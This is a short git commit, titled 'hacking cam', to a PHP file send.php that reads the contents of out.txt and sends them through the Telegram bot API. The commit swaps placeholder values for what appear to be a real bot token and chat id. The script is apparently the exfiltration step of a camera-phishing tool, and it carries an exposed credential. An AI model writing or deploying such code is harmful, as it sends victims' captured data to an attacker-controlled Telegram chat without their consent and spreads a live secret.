ab44ec0f46c87b7e2995d57a34221d03496c8505
ilyaking8870 <90982987+ilyaking8870@users.noreply.github.com>
2021-10-31 18:53:09 +0330

    hacking cam

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot2027907667:AAGnRMymCn6oNbWTif3_eOr1LAf_B7_XkU0/sendMessage?chat_id=1835257605&text=$msg");
 ?>
